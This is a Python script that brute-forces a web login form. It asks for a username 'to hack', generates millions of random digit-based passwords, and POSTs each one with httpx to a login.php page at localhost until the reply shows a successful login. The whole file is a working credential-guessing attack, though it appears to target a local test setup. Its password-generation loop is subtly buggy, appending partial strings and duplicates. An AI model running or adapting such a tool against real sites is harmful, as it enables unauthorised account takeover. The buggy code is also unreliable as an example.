import httpx
import random


#with open("password_new.txt") as f:
   # passwords = f.read().splitlines()

passwords =[]
for i in range(7311616):
    password =""
    for j in range(4):
        #ABCDEFGHIJKLMNOPQRSTUVWXYZ
        password+=random.choice('12345')
        passwords.append(password)
username = input("Enter Username To Hack: ")
#print(passwords)
url = "http://localhost/login.php"

session = httpx.Client()

for password in passwords:
    response = session.post(url, data={"username": username, "password": password})
    print(f"Request Url: {response.url}")
    print(f"Request status code: {response.status_code}")
    if "You are logged in!" in response.text:
        print(f"Password cracked: {password}")
        break
    else: 
         print("No password cracked!")

session.close()